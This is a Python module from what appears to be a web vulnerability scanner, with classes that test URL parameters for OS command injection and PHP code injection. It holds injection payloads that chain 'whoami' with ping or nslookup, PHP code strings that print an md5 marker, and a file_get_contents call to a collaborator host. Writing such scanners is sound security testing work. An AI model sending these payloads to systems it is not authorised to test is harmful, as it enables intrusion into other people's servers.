
import re
from core.scan.module import *

class OsCommandInjection(GeneralScanner):

    def __init__(self, config) -> None:
        GeneralScanner.__init__(self, config)


    def check(self):
        # check if url has parameters
        # we cannot scan OsCommandInjection without parameters
        # put all prameters to vulnerable_params for scan it with payloads
        
        self.InsertAllParamsToScan()
        return bool(self.may_vulnerable_params)


    def GetPayloads(self) -> list:
        collaborator = self.options.get('collaborator')
        commands = ["whoami;ping -c1 localhost","whoami&&ping -c1 localhost"]

        if collaborator:
            commands.append("whoami&&nslookup " + urlparse(collaborator).netloc)

        return commands

    
    def is_vulnerable(self,response):
        return bool(re.findall("icmp|64 bytes from|min/avg/max/mdev", response.text, re.I))


class PHPCodeInjection(GeneralScanner):

    def __init__(self, config) -> None:
        GeneralScanner.__init__(self, config)

    def check(self):
        # check if url has parameters
        # we cannot scan PHPCodeInjection without parameters
        # put all prameters to vulnerable_params for scan it with payloads
        
        self.InsertAllParamsToScan()
        return bool(self.may_vulnerable_params)


    def GetPayloads(self) -> list:
        collaborator = self.options.get('collaborator')
        commands = [";${@print(md5(RCEB00M))};",";${@print(md5(\"RCEB00M\"))};"]

        if collaborator:
            host = urlparse(collaborator).netloc
            commands.append(";${@file_get_contents(\"http://{0}\")};".format(host))

        return commands
    
    def is_vulnerable(self,response):
        return "d091985aa0f4e2a2936490e2b978e057" in response.text
